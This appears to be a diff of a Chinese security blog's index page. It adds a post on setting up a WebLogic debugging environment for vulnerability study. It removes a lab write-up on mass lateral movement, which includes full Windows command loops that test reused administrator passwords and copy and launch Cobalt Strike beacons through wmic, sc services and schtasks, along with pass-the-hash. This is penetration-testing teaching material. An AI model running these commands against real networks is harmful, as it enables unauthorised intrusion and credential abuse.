@@ -152,6 +152,121 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">weblogic漏洞分析系列之调试环境搭建</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-10-30 20:32:17" itemprop="dateCreated datePublished" datetime="2020-10-30T20:32:17+08:00">2020-10-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-12-24 10:05:01" itemprop="dateModified" datetime="2020-12-24T10:05:01+08:00">2020-12-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        最近一直在做一些项目，因为对一些原理性的知识不懂感觉渗透很难再继续往上走，因此接下来打算将精力放在漏洞的理解和分析，工具的编写和优化上面，而不再执着于更多的技巧。</p>
+<p>​        weblogic是一款比较经常使用的java容器，当然它爆出的漏洞也是层出不穷，为了能让自己更加了解weblogic漏洞的形成原因，我决定和大家一起调试weblogic各个版本的一些漏洞，并最终编写一个简单的weblogic漏洞检测工具，在这片文章中，我们首先一起来学习一下如何搭建weblogic的调试环境。</p>
+<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>​        首先，在官网下载weblogic的安装包，双击进行安装</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210608351.png" alt="image-20201030210608351"></p>
+<p>​        安装好以后，创建weblogic域</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210658376.png" alt="image-20201030210658376"></p>
+<p>​        安装成功后，在domains下的bin目录下有个startWebLogic.cmd文件</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210904700.png" alt="image-20201030210904700"></p>
+<p>​        编辑startWebLogic.cmd文件，在文件的开头加上如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set JAVA_OPTIONS&#x3D;-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,address&#x3D;9999,server&#x3D;y,suspend&#x3D;n</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030204516719.png" alt="image-20201030204516719"></p>
+<p>​        双击startWebLogic.cmd启动weblogic,可以看到已经开启了9999端口的监听</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210943558.png" alt="image-20201030210943558"></p>
+<p>​        同时使用netstat查看，也可以看到9999端口的监听</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211009015.png" alt="image-20201030211009015"></p>
+<p>​        打开idea,import wlserver_10.3这个目录</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211258783.png" alt="image-20201030211258783"></p>
+<p>​        在server/lib目录上选择add as library</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211344142.png" alt="image-20201030211344142"></p>
+<p>​        选择调试配置</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211447373.png" alt="image-20201030211447373"></p>
+<p>​        添加一个remote的配置</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230633634.png" alt="image-20201030230633634"></p>
+<p>端口选择9999端口</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230709499.png" alt="image-20201030230709499"></p>
+<p>​        我们再点击debug，如果成功则会出现Connected to the target VM, address: ‘127.0.0.1:9999’, transport: ‘socket’，没成功的话可以重新运行startWebLogic.cmd文件再去debug。</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230745586.png" alt="image-20201030230745586"></p>
+<p>​        为了测试能否下断点，我们首先测试一下CVE-2017-10271这个漏洞，再漏洞的返回包中查看调用链，这里可以看到调用了weblogic.wsee.workarea.WorkContextXmlInputAdapter类的readUTF方法</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230958127.png" alt="image-20201030230958127"></p>
+<p>​        我们找到readUTF方法并下断点，查看能否断住，我这里可以成功下到断点，至此，weblogic的调试环境搭建成功。</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030231147688.png" alt="image-20201030231147688"></p>
+<h2 id="JDK内置函数无法继续跟踪"><a href="#JDK内置函数无法继续跟踪" class="headerlink" title="JDK内置函数无法继续跟踪"></a>JDK内置函数无法继续跟踪</h2><p>​        在调试过程中，发现当调用xlDecoder.readObject()函数时，无法继续深入跟踪，在idea的顶部也有一个报错。</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031095622944.png" alt="image-20201031095622944"></p>
+<p>​        经过分析weblogic默认使用自带的jdk6来编译运行，而我使用的是jdk8,因此需要改变jdk的版本。选择 <code>Project Structure</code>，在project中new一个jdk，选择weblogic自带的jdk，如下如图所示：</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031100649371.png" alt="image-20201031100649371"></p>
+<p>​        修改以后即可跟踪到readObject这个函数的执行过程</p>
+<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031101247175.png" alt="image-20201031101247175"></p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">WebLogic-动态调试环境搭建</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/09/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1601,152 +1716,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网批量横向渗透的学习总结</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-31 12:07:47" itemprop="dateCreated datePublished" datetime="2020-08-31T12:07:47+08:00">2020-08-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-02 20:04:50" itemprop="dateModified" datetime="2020-09-02T20:04:50+08:00">2020-09-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        之前的学习中我们了解了关于横向移动的方式，当我们知道了这些方式，下一步当然是想要去提高速度，在这篇文章中我将带着大家学习如何来批量上线内网主机。</p>
-<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>192.168.3.* 为仅主机模式的网段</p>
-<p>192.168.5.*为nat模式的网段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OWA2013 192.168.3.144 192.168.5.58   边界机</span><br><span class="line">SRV-WEB-KIT 192.168.3.73   内网断网机</span><br><span class="line">PC-JERRY-KIT 192.168.3.75 192.168.5.59   内网出网机</span><br></pre></td></tr></table></figure>
-
-<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>​        我们首先学习一下如何使用WMI来批量上线内网主机</p>
-<p>​        当我们获取了某个主机的密码，我们想测试是否有内网主机和这个主机的密码相同，首先需要扫描内网那些主机开放了445端口。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831135507642.png" alt="image-20200831135507642"></p>
-<p>​        得到这些开放445端口的ip后，我们将这些ip写到一个文件中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell echo 192.168.3.73 &gt;&gt; c:\windows\temp\host.txt</span><br><span class="line">shell echo 192.168.3.75 &gt;&gt; c:\windows\temp\host.txt</span><br></pre></td></tr></table></figure>
-
-<p>​        除了上面这种方式，当然也可以将host.txt在本地写好再上传到边界主机上。</p>
-<p>​        当我们得到哪些主机开放了445端口以后，我们想测试我们得到的密码在哪些主机上是相同的,可以使用net use建立ipc连接来进行测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\host.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\windows\temp\login_succeed.txt ) &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140152324.png" alt="image-20200831140152324"></p>
-<p>​        然后我们准备生成一个shell，再通过wmi来执行达到批量上线的目的。shell生成最好生成pivot listener，因为我们并不能确定内网主机是否能出外网</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140743070.png" alt="image-20200831140743070"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140845228.png" alt="image-20200831140845228"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140914981.png" alt="image-20200831140914981"></p>
-<p>​        生成好以后将生成的beacon.exe上传到边界主机</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831141039574.png" alt="image-20200831141039574"></p>
-<p>​        使用wmic执行beacon.exe批量上线</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; wmic &#x2F;node:%i &#x2F;user:administrator &#x2F;password:xxx PROCESS call create &quot;\\%i\admin$\temp\beacon.exe&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142003540.png" alt="image-20200831142003540"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142030428.png" alt="image-20200831142030428"></p>
-<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>​        在cobaltstrike中，内置了可以通过jump psexec来进行横向渗透的方法，这种方法我们既可以通过建立pivot listener来批量上线，也可以通过使用smb beacon来执行上线。下面我以smb beacon为例来演示下如何通过jump psexec来批量上线内网断网主机。<br>​        要使用smb beacon来上线，首先要创建一个smb类型的listener</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144047330.png" alt="image-20200831144047330"></p>
-<p>​        选择target，按住shift选中我们想要上线的几个目标。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144139103.png" alt="image-20200831144139103"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144237104.png" alt="image-20200831144237104"></p>
-<p>​        选择psexec模块，listener选择我们创建的smb listener</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144319681.png" alt="image-20200831144319681"></p>
-<p>​        选择lauch后，CS执行的操作如下</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144519451.png" alt="image-20200831144519451"></p>
-<p>​        同时两台内网的主机上线，因为用的是psexec的方式，所以是通过rundll32来执行上线的</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144603432.png" alt="image-20200831144603432"></p>
-<p>​        这里对比一下WMI批量上线，我们可以发现使用WMI上线后的权限为当前用户的权限，而使用psexec上线后的权限为system权限。</p>
-<p>​        最后我们再测试下使用psexec的这种上线方式能不能通过hash传递来利用，其他的步骤是一样的，只有在传递密码时输入变成了hash</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145220858.png" alt="image-20200831145220858"></p>
-<p>​        CobaltStrike执行的操作如下</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145543919.png" alt="image-20200831145543919"></p>
-<p>​        执行后也可以上线</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152157468.png" alt="image-20200831152157468"></p>
-<p>​        这里有一个小插曲，就是我第一次使用hash传递上线这两台主机时发现只有192.168.3.73这台主机上线，而win10 192.168.3.75没有上线，然后我是用impacket的psexec利用hash传递进行测试，发现无法使用administrator连接，但是我用net use 连接administrator账户又是正常的，经过排错，我发现是因为administrator账户是禁用状态导致的，启用后即可正常执行。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152344500.png" alt="image-20200831152344500"></p>
-<p>​        这里也说明了一个问题，就是即使一个账户是禁用的，在我们知道账号密码的情况下，也是可以通过net use来连接的，但是无法通过pth来连接并且利用。</p>
-<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        既然要在cobaltstrike通过service来进行批量上线的操作，首先需要生成一个service类型的shell，其次我们需要将这个shell上传到内网主机执行来上线。</p>
-<p>​        首先在目标边界主机上创建一个pivot类型的listener</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154146904.png" alt="image-20200831154146904"></p>
-<p>​        创建时候注意在host选择边界机内网所对应的ip，这个一定要注意，否则是上线不了断网主机的。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154317379.png" alt="image-20200831154317379"></p>
-<p>​        生成一个Stageless，listener选择我们创建的listener，输出类型选择service类型</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154448333.png" alt="image-20200831154448333"></p>
-<p>​            将生成的文件上传到边界主机上</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154713116.png" alt="image-20200831154713116"></p>
-<p>​        使用sc来批量上线，至于login_success.txt那个文件怎么来的，参考WMI利用的那种方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i create xxxxxxxxxxxxxxxxxxxxxxxx binpath&#x3D; &quot;c:\windows\temp\beacon.exe&quot;  &amp;&amp; sc \\%i start xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155355171.png" alt="image-20200831155355171"></p>
-<p>​        使用完以后，记得要将这个服务删除</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i delete xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155845466.png" alt="image-20200831155845466"></p>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>​        我们也可以使用计划任务来批量横向渗透，至于前面生成shell的过程就不演示了，我们这里还是考虑目标主机是断网的一个状态，所以还是要创建一个pivot listener，生成一个Stageless类型的shell，上传到目标边界主机。使用如下命令来创建并执行计划任务上线</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; schtasks &#x2F;create &#x2F;s %i &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;xxxxxxxxxxx&quot; &#x2F;tr &quot;c:\windows\temp\beacon.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 &amp;&amp; schtasks &#x2F;run &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; schtasks &#x2F;query &#x2F;s %i &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxxx&quot; | findstr &quot;xxxxxxxxxxx&quot; &amp;&amp; schtasks &#x2F;delete &#x2F;F &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831165538229.png" alt="image-20200831165538229"></p>
